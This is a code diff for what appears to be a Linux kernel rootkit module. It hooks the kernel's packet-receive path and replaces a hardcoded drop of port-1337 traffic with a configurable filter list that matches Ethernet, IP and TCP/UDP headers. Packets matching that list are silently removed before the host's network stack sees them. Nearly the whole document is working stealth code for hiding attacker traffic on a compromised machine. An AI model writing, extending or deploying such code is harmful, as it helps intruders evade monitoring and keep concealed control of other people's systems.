@@ -6,27 +6,16 @@
 
 #include <license.h>
 #include <hide.h>
+#include <config.h>
 #include <hook.h>
 #include <ksyms.h>
 
-// #define net_timestamp_check(COND, SKB)
-//     if (static_branch_unlikely(ksyms__netstamp_needed_key)) {
-//         if ((COND) && !(SKB)->tstamp)                        
-//             __net_timestamp(SKB);                        
-//     }                                                        
-
-static int __netif_receive_skb_hook(struct sk_buff *skb)
-{
-    printk(KERN_INFO "__netif_receive_skb_hook!");
-
-    return 0;
-}
-
-static int netif_rx_hook(struct sk_buff *skb)
-{
-    printk(KERN_INFO "netif_rx_hook!");
-    return 0;
-}
+// static_branch_unlikely does not compile with ksyms use so it seems,
+// so no optimization for you
+#define net_timestamp_check(COND, SKB)                          \
+/* if (static_branch_unlikely(ksyms__netstamp_needed_key)) { */ \
+        if ((COND) && !(SKB)->tstamp)                           \
+            __net_timestamp(SKB);                               \
 
 static void __netif_receive_skb_list(struct list_head *head)
 {
@@ -35,21 +24,39 @@ static void __netif_receive_skb_list(struct list_head *head)
     bool pfmemalloc = false; /* Is current sublist PF_MEMALLOC? */
 
     /* hook variables */
+    int i;
+    struct config_netfilter *filter;
+    struct ethhdr *eth;
     struct iphdr *ip;
-    struct tcphdr *tcp;
+    void *transport;
 
     list_for_each_entry_safe(skb, next, head, list) {
 
         /* hook code start */
 
+        eth = (struct ethhdr *)skb_mac_header(skb);
         ip = (struct iphdr *)skb_network_header(skb);
-        tcp = (struct tcphdr *)((u8 *)ip + sizeof(struct iphdr));
-        printk(KERN_INFO "src_ip: %x dst_ip: %x src_port: %d dst_port: %d",
-            ntohl(ip->saddr), ntohl(ip->daddr), ntohs(tcp->source), ntohs(tcp->dest));
+        transport = skb_transport_header(skb);
         
-        if (ntohs(tcp->dest) == 1337) {
+        for (i = 0; i < hide_packets_count; i++) {
+            filter = &hide_packets[i];
+
+            if (!filter_eth(filter, eth->h_proto, eth->h_source, eth->h_dest))
+                continue;
+
+            if (eth->h_proto == htons(ETH_P_IP) && !filter_ip(filter, ip->protocol, ip->saddr, ip->daddr))
+                continue;
+
+            if (ip->protocol == IPPROTO_TCP
+            && !filter_transport(filter, ((struct tcphdr *)transport)->source, ((struct tcphdr *)transport)->dest))
+                continue;
+
+            else if (ip->protocol == IPPROTO_UDP
+            && !filter_transport(filter, ((struct udphdr *)transport)->source, ((struct udphdr *)transport)->dest))
+                continue;
+
             skb_list_del_init(skb);
-            continue;
+            goto end;
         }
 
         /* hook code end */
@@ -73,21 +80,25 @@ static void __netif_receive_skb_list(struct list_head *head)
     /* Handle the remaining sublist */
     if (!list_empty(head))
         ksyms____netif_receive_skb_list_core(head, pfmemalloc);
+
+end:
     /* Restore pflags */
     if (pfmemalloc)
         memalloc_noreclaim_restore(noreclaim_flag);
 }
 
+/**
+ * No logic changes were made here, but the target function `__netif_receive_skb_list`
+ * is inlined in the kernel tested against and is therefore unhookable.
+ */
 static void netif_receive_skb_list_internal_hook(struct list_head *head)
 {
     struct sk_buff *skb, *next;
     struct list_head sublist;
 
-    // printk(KERN_INFO "FINALLY A CORRECT HOOK!");
-
     INIT_LIST_HEAD(&sublist);
     list_for_each_entry_safe(skb, next, head, list) {
-        // net_timestamp_check(netdev_tstamp_prequeue, skb);
+        net_timestamp_check(ksyms__netdev_tstamp_prequeue, skb);
         skb_list_del_init(skb);
         if (!skb_defer_rx_timestamp(skb))
             list_add_tail(&skb->list, &sublist);
@@ -113,7 +124,4 @@ static void netif_receive_skb_list_internal_hook(struct list_head *head)
     rcu_read_unlock();
 }
 
-// HOOK_DEFINE(hide, netif_receive_skb, &netif_receive_skb, &netif_receive_skb_hook);
-HOOK_DEFINE(hide, __netif_receive_skb, ksyms____netif_receive_skb, &__netif_receive_skb_hook);
-HOOK_DEFINE(hide, netif_rx, &netif_rx, &netif_rx_hook);
 HOOK_DEFINE(hide, netif_receive_skb_list_internal, ksyms__netif_receive_skb_list_internal, &netif_receive_skb_list_internal_hook);
